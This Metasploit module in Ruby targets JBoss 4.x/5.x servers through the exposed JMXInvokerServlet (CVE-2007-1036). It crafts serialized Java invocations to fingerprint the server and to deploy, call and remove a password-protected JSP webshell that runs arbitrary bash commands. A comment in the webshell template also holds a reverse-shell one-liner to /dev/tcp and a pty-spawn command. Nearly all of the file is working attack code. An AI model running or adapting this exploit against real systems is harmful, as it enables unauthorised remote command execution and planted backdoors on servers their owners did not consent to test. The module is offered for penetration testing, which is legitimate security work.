##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class MetasploitModule < Msf::Auxiliary

  HttpFingerprint = { :pattern => [ /JBoss/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE



  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'JBoss upload webshell via JMXInvokerServlet',
      'Description' => %q{
          This module can be used to execute a webshell on JBoss servers that have an
        exposed HTTPAdaptor's JMX Invoker exposed on the "JMXInvokerServlet". By invoking
        the methods provided by jboss.admin:DeploymentFileRepository, a webshell is deployed
        to the target. The DeploymentFileRepository methods are only available on 
        Jboss 4.x and 5.x. This works even with SElinux in enforced mode or egress firewall :)
      },
      'Author'      => [
        'Patrick Hof', # Vulnerability discovery, analysis and PoC
        'Jens Liebchen', # Vulnerability discovery, analysis and PoC
        'h0ng10', # Metasploit module
        'nu11_nu11' # Webshell mods
      ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2007-1036' ],
          [ 'OSVDB', '33744' ],
          [ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
        ],
      'DisclosureDate' => 'Sep 03 2016',
      'Arch'        => ARCH_JAVA,
      'Stance'      => Msf::Exploit::Stance::Aggressive,
      'Actions'       =>
        [ 
          ['Info', {'Description' => 'Get JBoss version and OS type as marshalled Java object'}],
          ['Deploy', {'Description' => 'Deploy the webshell to the target'}],
          ['Undeploy', {'Description' => 'Remove the webshell from the target (mind APPBASE and JSP options!)'}]
        ],
      'DefaultAction' => 'Info'))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new('JSP',       [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),
          OptString.new('APPBASE',   [ false, 'Application base name, (default: random)', nil ]),
          OptString.new('WEBSHELLPW',[ false, 'Password used to protect the webshell (default: random)', nil]),
          OptString.new('TARGETURI', [ true,  'The URI path of the invoker servlet', '/invoker/JMXInvokerServlet' ]),
        ], self.class)

  end



  def run

    # Put some vars together...
    regex_webshell_app_base = datastore['APPBASE'] || Rex::Text.rand_text_alpha(14)
    regex_webshell_jsp_name = datastore['JSP'] || Rex::Text.rand_text_alpha(14)
    webshell_uri = "/#{regex_webshell_app_base}/#{regex_webshell_jsp_name}.jsp"
    webshellpw = datastore['WEBSHELLPW'] || Rex::Text.rand_text_alpha(14)

    replace_values = {
      'regex_app_base' => regex_webshell_app_base,
      'regex_jsp_name' => regex_webshell_jsp_name,
      'jsp_code' => generate_webshell(webshellpw)
    }

    case action.name
    when 'Info'
      print_status('Information on target')
      res_version = send_serialized_request('version')
      res_osname = send_serialized_request('osname')
      res_osarch = send_serialized_request('osarch')
      if res_version.nil? || res_osname.nil? || res_osarch.nil?
        print_error('This request didn\'t work...')
      else
	v = Marshal.dump(res_version.body)
	print_status("#{v}")
        print_status("Version: #{res_version.body}")
        print_status("OS: #{res_osname.body}")
        print_status("Arch: #{res_osarch.body}")
      end
    when 'Deploy'
      print_status('Deploying webshell')
      print_status("Webshell password: #{webshellpw}")
      send_serialized_request('installwebshell', replace_values)
      print_status("Calling webshell: #{webshell_uri}")
      call_uri_mtimes(webshell_uri, 5, 'GET')
    when 'Undeploy'
      print_status('Removing webshell')
      send_serialized_request('removewebshellfile', replace_values)
      send_serialized_request('removewebshelldirectory', replace_values)
    end

  end



  def generate_webshell(webshellpw_param)

    webshell_script = <<-EOT
<%@ page import="java.util.*,java.io.*"%>
<%
// The webshell...
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="webshell" ACTION="">
CMD: <INPUT TYPE="text" NAME="cmd"> 
PASS: <INPUT TYPE="password" NAME="passwd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<!--
   bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 &
   python -c 'import pty; pty.spawn("/bin/bash")'
   # Links:
   # http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
   # http://netsec.ws/?p=337
-->
<pre>
<%
String password = "#{webshellpw_param}";
String suppliedpw = request.getParameter("passwd");
if ((request.getParameter("cmd") != null) && (suppliedpw.equals(password))) {
        String cmd = request.getParameter("cmd");
        String[] cmd_ary = new String[] { "/bin/bash", "-c", cmd };
        out.println("Command: " + cmd + "\\n");
        try {
          Process p = Runtime.getRuntime().exec(cmd_ary);
	  OutputStream os = p.getOutputStream();
          InputStream in = p.getInputStream();
          DataInputStream dis = new DataInputStream(in);
          String disr = dis.readLine();
          while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
        catch(Throwable t) {
          t.printStackTrace();
        }
}
else {
        out.println("I kindly refuse to work with you. Bugger off!<br>");
}
%>
</pre>
</BODY></HTML>
EOT

  end



  def send_serialized_request(operation , replace_params = {})
    data = ''
    case operation
    when 'version'
      data = build_get_version.encode
    when 'osname'
      data = build_get_os.encode
    when 'osarch'
      data = build_get_arch.encode
    when 'installwebshell'
      data = build_install_webshell(
        war_name: replace_params['regex_app_base'],
        jsp_name: replace_params['regex_jsp_name'],
        data: replace_params['jsp_code']
      ).encode
    when 'removewebshellfile'
      data = build_delete_webshell_file(
        dir: "#{replace_params['regex_app_base']}.war",
        file: replace_params['regex_jsp_name'],
        extension: '.jsp'
      ).encode
    when 'removewebshelldirectory'
      data = build_delete_webshell_file(
        dir: './',
        file: replace_params['regex_app_base'],
        extension: '.war'
      ).encode
    else
      fail_with(Failure::Unknown, "#{peer} - Unexpected operation")
    end

    res = send_request_cgi({
      'uri'     => normalize_uri(target_uri.path),
      'method'  => 'POST',
      'data'    => data,
      'headers' =>
        {
          'ContentType:' => 'application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation',
          'Accept' =>  'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2'
        }
    }, 25)


    unless res && res.code == 200
      print_error("Failed: Error requesting preserialized request #{operation}")
      return nil
    end

    res
  end



  def call_uri_mtimes(uri, num_attempts = 5, verb = nil, data = nil)
    # JBoss might need some time for the deployment. Try 5 times at most and
    # wait 5 seconds inbetween tries
    num_attempts.times do |attempt|
      if verb == "POST"
        res = send_request_cgi(
          {
            'uri'    => uri,
            'method' => verb,
            'data'   => data
          }, 5)
      else
        uri += "?#{data}" unless data.nil?
        res = send_request_cgi(
          {
            'uri'    => uri,
            'method' => verb
          }, 30)
      end

      msg = nil
      if res.nil?
        msg = "Execution failed on #{uri} [No Response]"
      elsif res.code < 200 || res.code >= 300
        msg = "http request failed to #{uri} [#{res.code}]"
      elsif res.code == 200
        vprint_status("Successfully called '#{uri}'")
        return res
      end

      if attempt < num_attempts - 1
        msg << ', retrying in 5 seconds...'
        vprint_status(msg)
        select(nil, nil, nil, 5)
      else
        print_error(msg)
        return res
      end
    end
  end



  def build_get_version
    builder = Rex::Java::Serialization::Builder.new

    object_array = builder.new_array(
      values_type: 'java.lang.Object;',
      values: [
        builder.new_object(
          name: 'javax.management.ObjectName',
          serial: 0xf03a71beb6d15cf,
          flags: 3,
          annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
        ),
        Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.system:type=Server')
      ],
      name: '[Ljava.lang.Object;',
      serial: 0x90ce589f1073296c,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )

    stream = Rex::Java::Serialization::Model::Stream.new
    stream.contents = []
    stream.contents << object_array
    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new
    stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'Version')

    build_invocation(stream)
  end



  def build_get_os
    builder = Rex::Java::Serialization::Builder.new

    object_array = builder.new_array(
        values_type: 'java.lang.Object;',
        values: [
          builder.new_object(
            name: 'javax.management.ObjectName',
            serial: 0xf03a71beb6d15cf,
            flags: 3,
            annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
          ),
          Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.system:type=ServerInfo')
        ],
        name: '[Ljava.lang.Object;',
        serial: 0x90ce589f1073296c,
        annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )

    stream = Rex::Java::Serialization::Model::Stream.new
    stream.contents = []
    stream.contents << object_array
    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new
    stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'OSName')

    build_invocation(stream)
  end



  def build_get_arch
    builder = Rex::Java::Serialization::Builder.new

    object_array = builder.new_array(
      values_type: 'java.lang.Object;',
      values: [
        builder.new_object(
          name: 'javax.management.ObjectName',
          serial: 0xf03a71beb6d15cf,
          flags: 3,
          annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
        ),
        Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.system:type=ServerInfo')
      ],
      name: '[Ljava.lang.Object;',
      serial: 0x90ce589f1073296c,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )

    stream = Rex::Java::Serialization::Model::Stream.new
    stream.contents = []
    stream.contents << object_array
    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new
    stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'OSArch')

    build_invocation(stream)
  end



  def build_install_webshell(opts = {})
    war_name = "#{opts[:war_name]}.war"
    jsp_name = opts[:jsp_name] || ''
    extension = opts[:extension] || '.jsp'
    data = opts[:data] || ''

    builder = Rex::Java::Serialization::Builder.new

    object_array = builder.new_array(
      values_type: 'java.lang.Object;',
      values: [
        builder.new_object(
          name: 'javax.management.ObjectName',
          serial: 0xf03a71beb6d15cf,
          flags: 3,
          annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
        ),
        Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.admin:service=DeploymentFileRepository'),
        Rex::Java::Serialization::Model::EndBlockData.new,
        Rex::Java::Serialization::Model::Utf.new(nil, 'store')
      ],
      name: '[Ljava.lang.Object;',
      serial: 0x90ce589f1073296c,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )

    values_array = builder.new_array(
      values_type: 'java.lang.Object;',
      values: [
        Rex::Java::Serialization::Model::Utf.new(nil, war_name),
        Rex::Java::Serialization::Model::Utf.new(nil, jsp_name),
        Rex::Java::Serialization::Model::Utf.new(nil, extension),
        Rex::Java::Serialization::Model::Utf.new(nil, data),
        builder.new_object(
          name: 'java.lang.Boolean',
          serial: 0xcd207280d59cfaee,
          annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
          fields: [['boolean', 'value']],
          data: [['boolean', 0]]
        )
      ],
      name: '[Ljava.lang.Object;',
      serial: 0x90ce589f1073296c,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )

    types_array = builder.new_array(
      values_type: 'java.lang.String;',
      values: [
        Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),
        Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),
        Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),
        Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),
        Rex::Java::Serialization::Model::Utf.new(nil, 'boolean')
      ],
      name: '[Ljava.lang.String;',
      serial: 0xadd256e7e91d7b47,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )

    stream = Rex::Java::Serialization::Model::Stream.new
    stream.contents = []
    stream.contents << object_array
    stream.contents << values_array
    stream.contents << types_array

    build_invocation_deploy(stream)
  end



  def build_delete_webshell_file(opts = {})
    dir = opts[:dir] || ''
    file = opts[:file] || ''
    extension = opts[:extension] || '.jsp'

    builder = Rex::Java::Serialization::Builder.new

    object_array = builder.new_array(
      values_type: 'java.lang.Object;',
      values: [
        builder.new_object(
          name: 'javax.management.ObjectName',
          serial: 0xf03a71beb6d15cf,
          flags: 3,
          annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
        ),
        Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.admin:service=DeploymentFileRepository'),
        Rex::Java::Serialization::Model::EndBlockData.new,
        Rex::Java::Serialization::Model::Utf.new(nil, 'remove')
      ],
      name: '[Ljava.lang.Object;',
      serial: 0x90ce589f1073296c,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )

    values_array = builder.new_array(
      values_type: 'java.lang.Object;',
      values: [
        Rex::Java::Serialization::Model::Utf.new(nil, dir),
        Rex::Java::Serialization::Model::Utf.new(nil, file),
        Rex::Java::Serialization::Model::Utf.new(nil, extension)
      ],
      name: '[Ljava.lang.Object;',
      serial: 0x90ce589f1073296c,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )

    types_array = builder.new_array(
      values_type: 'java.lang.String;',
      values: [
      Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),
      Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String'),
      Rex::Java::Serialization::Model::Utf.new(nil, 'java.lang.String')
      ],
      name: '[Ljava.lang.String;',
      serial: 0xadd256e7e91d7b47,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )

    stream = Rex::Java::Serialization::Model::Stream.new
    stream.contents = []
    stream.contents << object_array
    stream.contents << values_array
    stream.contents << types_array

    build_invocation_deploy(stream)
  end



  def build_invocation(stream_argument)
    stream = Rex::Java::Serialization::Model::Stream.new
    stream.contents = []

    null_stream = build_null_stream
    null_stream_enc = null_stream.encode
    null_stream_value = [null_stream_enc.length].pack('N')
    null_stream_value << null_stream_enc
    null_stream_value << "\xfb\x57\xa7\xaa"

    stream_argument_enc = stream_argument.encode
    stream_argument_value = [stream_argument_enc.length].pack('N')
    stream_argument_value << stream_argument_enc
    stream_argument_value << "\x7b\x87\xa0\xfb"

    stream.contents << build_marshalled_invocation
    stream.contents << Rex::Java::Serialization::Model::NullReference.new
    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x97\x51\x4d\xdd\xd4\x2a\x42\xaf")
    stream.contents << build_integer(647347722)
    stream.contents << build_marshalled_value
    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, stream_argument_value)
    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new
    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00\x00\x00\x01")
    stream.contents << build_invocation_key(5)
    stream.contents << build_marshalled_value
    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, null_stream_value)
    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new
    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00\x00\x00\x02")
    stream.contents << build_invocation_key(4)
    stream.contents << build_invocation_type(1)
    stream.contents << build_invocation_key(10)
    stream.contents << Rex::Java::Serialization::Model::NullReference.new
    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new

    stream
  end



  def build_invocation_deploy(stream_argument)
    builder = Rex::Java::Serialization::Builder.new
    stream = Rex::Java::Serialization::Model::Stream.new
    stream.contents = []

    null_stream = build_null_stream
    null_stream_enc = null_stream.encode
    null_stream_value = [null_stream_enc.length].pack('N')
    null_stream_value << null_stream_enc
    null_stream_value << "\xfb\x57\xa7\xaa"

    stream_argument_enc = stream_argument.encode
    stream_argument_value = [stream_argument_enc.length].pack('N')
    stream_argument_value << stream_argument_enc
    stream_argument_value << "\x7b\x87\xa0\xfb"

    stream.contents << build_marshalled_invocation
    stream.contents << Rex::Java::Serialization::Model::NullReference.new
    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x78\x94\x98\x47\xc1\xd0\x53\x87")
    stream.contents << build_integer(647347722)
    stream.contents << build_marshalled_value
    stream.contents << Rex::Java::Serialization::Model::BlockDataLong.new(nil, stream_argument_value)
    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new
    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00\x00\x00\x01")
    stream.contents << build_invocation_key(5)
    stream.contents << build_marshalled_value
    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, null_stream_value)
    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new
    stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00\x00\x00\x03")
    stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'JMX_OBJECT_NAME')
    stream.contents << builder.new_object(
      name: 'javax.management.ObjectName',
      serial: 0xf03a71beb6d15cf,
      flags: 3,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )
    stream.contents << Rex::Java::Serialization::Model::Utf.new(nil, 'jboss.admin:service=DeploymentFileRepository')
    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new
    stream.contents << build_invocation_key(4)
    stream.contents << build_invocation_type(1)
    stream.contents << build_invocation_key(10)
    stream.contents << Rex::Java::Serialization::Model::NullReference.new
    stream.contents << Rex::Java::Serialization::Model::EndBlockData.new

    stream
  end



  def build_marshalled_invocation
    builder = Rex::Java::Serialization::Builder.new
    builder.new_object(
      name: 'org.jboss.invocation.MarshalledInvocation',
      serial: 0xf6069527413ea4be,
      flags: Rex::Java::Serialization::SC_BLOCK_DATA | Rex::Java::Serialization::SC_EXTERNALIZABLE,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )
  end



  def build_marshalled_value
    builder = Rex::Java::Serialization::Builder.new
    builder.new_object(
      name: 'org.jboss.invocation.MarshalledValue',
      serial: 0xeacce0d1f44ad099,
      flags: Rex::Java::Serialization::SC_BLOCK_DATA | Rex::Java::Serialization::SC_EXTERNALIZABLE,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
    )
  end



  def build_invocation_key(ordinal)
    builder = Rex::Java::Serialization::Builder.new
    builder.new_object(
      name: 'org.jboss.invocation.InvocationKey',
      serial: 0xb8fb7284d79385f9,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
      fields: [
        ['int', 'ordinal']
      ],
      data:[
        ['int', ordinal]
      ]
    )
  end



  def build_invocation_type(ordinal)
    builder = Rex::Java::Serialization::Builder.new
    builder.new_object(
      name: 'org.jboss.invocation.InvocationType',
      serial: 0x59a73a1ca52b7cbf,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
      fields: [
        ['int', 'ordinal']
      ],
      data:[
        ['int', ordinal]
      ]
    )
  end



  def build_integer(value)
    builder = Rex::Java::Serialization::Builder.new
    builder.new_object(
      name: 'java.lang.Integer',
      serial: 0x12e2a0a4f7818738,
      annotations: [Rex::Java::Serialization::Model::EndBlockData.new],
      super_class: builder.new_class(
        name: 'java.lang.Number',
        serial: 0x86ac951d0b94e08b,
        annotations: [Rex::Java::Serialization::Model::EndBlockData.new]
      ),
      fields: [
        ['int', 'value']
      ],
      data:[
        ['int', value]
      ]
    )
  end



  def build_null_stream
    stream = Rex::Java::Serialization::Model::Stream.new
    stream.contents = [Rex::Java::Serialization::Model::NullReference.new]

    stream
  end



end

